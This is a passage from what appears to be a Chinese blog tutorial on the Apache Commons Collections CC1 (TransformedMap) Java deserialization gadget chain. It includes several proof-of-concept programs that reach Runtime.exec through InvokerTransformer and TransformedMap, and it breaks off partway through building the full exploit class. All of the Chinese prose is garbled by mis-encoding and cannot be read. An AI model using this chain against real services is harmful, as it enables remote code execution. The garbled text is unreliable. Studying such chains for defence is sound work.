æä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚</li></ul><h3 id="åŒ…ç»“æ„ä»‹ç»"><a href="#åŒ…ç»“æ„ä»‹ç»" class="headerlink" title="åŒ…ç»“æ„ä»‹ç»"></a>åŒ…ç»“æ„ä»‹ç»</h3><ul><li><code>org.apache.commons.collections</code> â€“ CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±»</li><li><code>org.apache.commons.collections.bag</code> â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.bidimap</code> â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.buffer</code> â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.collection</code> â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.comparators</code>â€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.functors</code> â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±»</li><li><code>org.apache.commons.collections.iterators</code> â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.keyvalue</code> â€“ å®ç°é›†åˆå’Œé”®&#x2F;å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.list</code> â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.map</code> â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.set</code> â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li></ul><h2 id="TransformMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ"><a href="#TransformMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ" class="headerlink" title="TransformMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ"></a>TransformMapç‰ˆCC1æ”»å‡»é“¾åˆ†æ</h2><ul><li>é¦–å…ˆæˆ‘ä»¬å†æ¬¡æ˜ç¡®ä¸€ä¸‹ååºåˆ—åŒ–çš„æ”»å‡»æ€è·¯ã€‚</li></ul><p>å…¥å£ç±»è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª <code>readObject</code> æ–¹æ³•ï¼Œç»“å°¾è¿™é‡Œéœ€è¦ä¸€ä¸ªèƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ã€‚æˆ‘ä»¬ä¸­é—´é€šè¿‡é“¾å­å¼•å¯¼è¿‡å»ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æ”»å‡»ä¸€å®šæ˜¯ä»å°¾éƒ¨å‡ºå‘å»å¯»æ‰¾å¤´çš„ï¼Œæµç¨‹å›¾å¦‚ä¸‹ã€‚</p><p><img src="/img/CC1/c04.png"></p><h3 id="å¯»æ‰¾å°¾éƒ¨çš„-exec-æ–¹æ³•"><a href="#å¯»æ‰¾å°¾éƒ¨çš„-exec-æ–¹æ³•" class="headerlink" title="å¯»æ‰¾å°¾éƒ¨çš„ exec æ–¹æ³•"></a>å¯»æ‰¾å°¾éƒ¨çš„ exec æ–¹æ³•</h3><p>æˆ‘ä»¬ç›´æ¥æ¥åˆ°cc1é“¾çš„æ ¸å¿ƒæ¥å£transfromeræ¥å£</p><p>å¿«æ·é”® ctrl + alt + Bï¼ŒæŸ¥çœ‹å®ç°æ¥å£çš„ç±»</p><p><img src="/img/CC1/c06.png"></p><p>å…¶ä¸­InvokerTransformerå¾ˆçªå‡ºï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“æ–¹æ³•æ˜¯ Java åå°„æœºåˆ¶çš„æ ¸å¿ƒæ–¹æ³•ï¼Œç”¨äºåŠ¨æ€è°ƒç”¨æ–¹æ³•</p><p>è½¬åˆ°InvokerTransformerç±»ï¼ŒæˆåŠŸæ‰¾åˆ°äº†ç±»ä¸­å­˜åœ¨çš„ä¸€ä¸ªåå°„è°ƒç”¨ä»»æ„ç±»ï¼Œå¯ä»¥ä½œä¸ºæˆ‘ä»¬é“¾å­çš„ç»ˆç‚¹</p><p><img src="/img/CC1/c07.png"></p><p>å¤ä¹ ä¸€ä¸‹åå°„poc</p><p>è·å–.classæ–‡ä»¶-&gt;è·å–æ–¹æ³•-&gt;ä¿®æ”¹ä½œç”¨åŸŸ(privateæ–¹æ³•)-&gt;invokeæ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        Class c= Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™String.classçš„åŸå› </p><p>åœ¨Javaåå°„ä¸­ï¼Œæ–¹æ³•é€šè¿‡ <strong>æ–¹æ³•å + å‚æ•°ç±»å‹åˆ—è¡¨</strong> å”¯ä¸€æ ‡è¯†ï¼š</p><table><thead><tr><th align="left">æ–¹æ³•è°ƒç”¨</th><th align="left">å¯¹åº”çš„execé‡è½½ç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="left"><code>getMethod(&quot;exec&quot;)</code></td><td align="left">âŒ ç¼–è¯‘é”™è¯¯ï¼ˆä¸æ˜ç¡®ï¼‰</td></tr><tr><td align="left"><code>getMethod(&quot;exec&quot;, String.class)</code></td><td align="left"><code>exec(String command)</code></td></tr><tr><td align="left"><code>getMethod(&quot;exec&quot;, String[].class)</code></td><td align="left"><code>exec(String[] cmdarray)</code></td></tr><tr><td align="left"><code>getMethod(&quot;exec&quot;, String.class, String[].class)</code></td><td align="left"><code>exec(String command, String[] envp)</code></td></tr></tbody></table><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC1/c08.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ„é€ ä¸€ä¸ªåˆ©ç”¨ <code>InvokerTransformer</code> ç±»å¼¹è®¡ç®—å™¨çš„ç¨‹åº</p><p>æ ¹æ®æ„é€ æ–¹æ³•æ„é€  EXPï¼Œå› ä¸ºæ˜¯ public çš„æ–¹æ³•ï¼Œè¿™é‡Œæ— éœ€åå°„</p><p><img src="/img/CC1/c09.png"></p><p>æ„é€ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        invokerTransformer.transform(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p>ä¸ä¸€å¼€å§‹ä½¿ç”¨åå°„çš„pocå¯¹æ¯”ï¼Œå…¶å®å°±æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ— éœ€åå°„çš„æ–¹æ³•</p><ul><li>æ³¨æ„æˆ‘ä»¬æœ€åä¸€å¥ <code>invokerTransformer.transform(runtime);</code></li><li>æ‰€ä»¥æˆ‘ä»¬ä¸‹ä¸€æ­¥çš„ç›®æ ‡æ˜¯å»æ‰¾è°ƒç”¨ <code>transform</code> æ–¹æ³•çš„ä¸åŒåå‡½æ•°</li></ul><h3 id="åˆæ­¥å¯»æ‰¾é“¾å­"><a href="#åˆæ­¥å¯»æ‰¾é“¾å­" class="headerlink" title="åˆæ­¥å¯»æ‰¾é“¾å­"></a>åˆæ­¥å¯»æ‰¾é“¾å­</h3><p>å³é”® â€“&gt; find usages(æŸ¥æ‰¾ç”¨æ³•)ï¼Œå¦‚æœ find usages è¿™é‡Œæœ‰é—®é¢˜çš„è¯ï¼Œå¯ä»¥å…ˆ <code>Ctrl+Alt+Shift+F7</code>ï¼Œé€‰æ‹© <code>All place</code> æŸ¥è¯¢ã€‚</p><p>ä¸€å…±æ˜¯æœ‰21å¤„ç”¨æ³•ï¼Œéœ€è¦é€ä¸ªæ’æŸ¥</p><p>ç›®çš„æ˜¯æ‰¾åˆ°æœ‰å…¶ä»–æ–¹æ³•è°ƒç”¨transfromï¼Œå‘ä¸Šå¯»æ‰¾å…¥å£</p><p>å¦‚ä½•æ’æŸ¥ï¼Ÿ</p><ol><li>è°ƒç”¨transformæ–¹æ³•çš„ç±»å¯ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œå¯æ§åˆ¶(èƒ½å¤Ÿä½¿å…¶è°ƒç”¨invokerTransformerä¸­çš„transformæ–¹æ³•)</li><li>èƒ½å¤Ÿæ‰¾åˆ°readObjecté“¾é¦–</li></ol><p>è¿™é‡Œæ‰¾åˆ° <code>TransformedMap</code> ç±»ä¸­å­˜åœ¨ <code>checkSetValue()</code> æ–¹æ³•è°ƒç”¨äº† <code>transform()</code> æ–¹æ³•</p><p><img src="/img/CC1/c10.png"></p><ul><li><p>OKï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å»çœ‹ä¸€çœ‹ <code>valueTransformer.checkSetValue</code> çš„ <code>valueTransformer</code> æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæœ€ç»ˆåœ¨ <code>TransformedMap</code> çš„æ„é€ å‡½æ•°ä¸­å‘ç°äº† <code>valueTransformer</code></p><p>ä½†æ˜¯æ˜¯ä¸€ä¸ªprotectedæ–¹æ³•</p></li></ul><p><img src="/img/CC1/c11.png"></p><ul><li>ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ï¼Œæ¥åˆ°decorateæ–¹æ³•</li></ul><p><img src="/img/CC1/c12.png"></p><p>çœ‹åˆ°æ­¤æ–¹æ³•æ˜¯publicæ–¹æ³•ï¼Œå°è¯•æ„é€ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decorateCalc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br> checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> checkSetValueMethod.invoke(decorateMap, runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ pocçš„è¿‡ç¨‹ï¼š</p><p>æŒ‰ç…§æˆ‘ä»¬åˆ†æå‡ºçš„æ–¹æ³•ä»å‰åˆ°åçš„è°ƒç”¨æµç¨‹ decorate(new TransformedMap)-&gt;checkSetValue(è°ƒç”¨invokerTransformerçš„transformæ–¹æ³•)</p><p>TransformedMapçš„æ„é€ æ–¹æ³•æ˜¯protectedç±»å‹ï¼Œæ‰€ä»¥éœ€è¦decorateæ–¹æ³•æ¥new TransformedMap</p><p>è¿™ä¹ˆä¸€çœ‹ï¼Œè°ƒç”¨ <code>.decorate</code> æ–¹æ³•å°±å¾ˆæœ‰å¿…è¦äº†ï¼Œè¿™å‡ å¥è¯­å¥æ˜¯ä¸ºäº†è¿ç”¨ <code>.decorate</code> æ–¹æ³•è€Œå­˜åœ¨çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br>HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br><span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br></code></pre></td></tr></table></figure><p>æ¥ç€ï¼Œå› ä¸º <code>.decorate</code> æ–¹æ³•è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»º <code>TransformedMap</code> å¯¹è±¡äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;<br></code></pre></td></tr></table></figure><p>å†é€šè¿‡åå°„æ„é€ æ”»å‡»æ‰‹æ®µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br>checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br>checkSetValueMethod.invoke(decorateMap, runtime);<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC1/c13.png"></p><h3 id="å®Œæ•´é“¾å­"><a href="#å®Œæ•´é“¾å­" class="headerlink" title="å®Œæ•´é“¾å­"></a>å®Œæ•´é“¾å­</h3><ul><li>ç›®å‰æ‰¾åˆ°çš„é“¾å­ä½äº <code>checkSetValue</code> å½“ä¸­ï¼Œå»æ‰¾ <code>.decorate</code> çš„é“¾å­ï¼Œå‘ç°æ— æ³•è¿›ä¸€æ­¥å‰è¿›äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å›åˆ° <code>checkSetValue</code> é‡æ–°æ‰¾é“¾å­ï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°readObjectæ–¹æ³•ä½œä¸ºé“¾é¦–</li></ul><p>ç»§ç»­ <code>find usages</code>ï¼Œæ‰¾åˆ°äº† <code>parent.checkSetValue(value);</code> è°ƒç”¨äº† <code>checkSetValue</code></p><p>æˆ‘ä»¬ç‚¹è¿›å»çœ‹ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ˜¯ <code>TransformedMap</code> çš„çˆ¶ç±»ã€‚</p><ul><li>è°ƒç”¨ <code>checkSetValue</code> æ–¹æ³•çš„ç±»æ˜¯ <code>AbstractInputCheckedMapDecorator</code> ç±»ä¸­çš„ä¸€ä¸ªå†…éƒ¨ç±» <code>MapEntry</code></li></ul><p><img src="/img/CC1/c14.png"></p><p>setValueå‡½æ•°ç”¨æ¥æ›´æ–°å½“å‰é”®å€¼å¯¹çš„å€¼ï¼Œè¿”å›æ—§å€¼ï¼Œå¹¶ä¼šåŒæ­¥ä¿®æ”¹åˆ°æ‰€å±çš„ <code>Map</code>ï¼Œåœ¨è¿›è¡ŒMapéå†æ—¶ï¼Œä¸€å®šä¼šèµ°å…¥setValueæ–¹æ³•</p><p>è¿™é‡Œè¿½è¸ªä¸€ä¸‹setValueå‡½æ•°</p><p><img src="/img/CC1/c15.png"></p><p><img src="/img/CC1/c16.png"></p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œ <code>.decorate</code> æ–¹æ³•è°ƒç”¨ï¼Œè¿›è¡Œ Map éå†çš„æ—¶å€™ï¼Œå°±ä¼šèµ°åˆ° <code>setValue()</code> å½“ä¸­ï¼Œè€Œ <code>setValue()</code> å°±ä¼šè°ƒç”¨ <code>checkSetValue</code></p><p>è¿™é‡Œå¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹éå†Mapæ˜¯å¦ä¼šè°ƒç”¨setValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">setValue01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;Object,Object&gt; entry : decorate.entrySet()) &#123;<br>            entry.setValue(runtime);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC1/c17.png"></p><ul><li>åˆ°æ­¤å¤„ï¼Œæˆ‘ä»¬çš„æ”»å‡»æ€è·¯å‡ºæ¥äº†ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ˜¯æ•°ç»„çš„å…¥å£ç±»ï¼Œéå†è¿™ä¸ªæ•°ç»„ï¼Œå¹¶æ‰§è¡Œ <code>setValue</code> æ–¹æ³•ï¼Œå³å¯æ„é€  Pocã€‚</li></ul><p>ä¸€å¥è¯æ¦‚æ‹¬ä¸€ä¸‹</p><blockquote><p>å¦‚ä½•éå†ä¸€ä¸ªMapæœ€ç»ˆæ‰§è¡Œ <code>setValue()</code> æ–¹æ³•</p></blockquote><p><strong>å¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ª <code>readObject()</code> é‡Œé¢è°ƒç”¨äº† <code>setValue()</code> å°±å¤ªå¥½äº†</strong></p><h3 id="å¯»æ‰¾-readObject-â€“-é“¾é¦–"><a href="#å¯»æ‰¾-readObject-â€“-é“¾é¦–" class="headerlink" title="å¯»æ‰¾ readObject() â€“ é“¾é¦–"></a>å¯»æ‰¾ readObject() â€“ é“¾é¦–</h3><ul><li>ä¹‹å‰é“¾å­æ˜¯åˆ° <code>setValue</code> çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ <code>setValue</code> å¤„ï¼ŒæŸ¥æ‰¾ç”¨æ³•</li></ul><p>åœ¨AnnotationInvocationHandler.classçš„readObjectæ–¹æ³•</p><p><img src="/img/CC1/c18.png"></p><p>å…ˆçœ‹æ„é€ æ–¹æ³•(ä¸ºäº†å®ä¾‹åŒ–è¿™ä¸ªç±»)</p><p><img src="/img/CC1/c19.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰Mapç±»å‹å‚æ•°ï¼Œå¯ä»¥å°†æˆ‘ä»¬æ„é€ å¥½çš„Mapç±»å‹å‚æ•°payloadç›´æ¥ä¼ å…¥</p><p>ä½†æ˜¯æ­¤æ–¹æ³•å¹¶ä¸æ˜¯publicï¼Œåœ¨javaä¸­ï¼Œåªè¦æ²¡æœ‰å†™publicï¼Œä½œç”¨åŸŸä¾¿æ˜¯defaultï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å–è¿™ä¸ªç±»åŠå…¶æ„é€ å‡½æ•°ï¼Œå†å®ä¾‹åŒ–å®ƒã€‚</p><p>åŒæ—¶å…³æ³¨åˆ°èƒ½å¤Ÿè¿›å…¥setValueæ–¹æ³•éœ€è¦æ»¡è¶³çš„ä¸¤ä¸ªæ¡ä»¶</p><p><img src="/img/CC1/c20.png"></p><h2 id="TransformMapç‰ˆCC1æ‰‹å†™-EXP"><a href="#TransformMapç‰ˆCC1æ‰‹å†™-EXP" class="headerlink" title="TransformMapç‰ˆCC1æ‰‹å†™ EXP"></a>TransformMapç‰ˆCC1æ‰‹å†™ EXP</h2><h3 id="åˆå§‹æ¡†æ¶"><a href="#åˆå§‹æ¡†æ¶" class="headerlink" title="åˆå§‹æ¡†æ¶"></a>åˆå§‹æ¡†æ¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;<br><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;calc&quot;</span>, <span 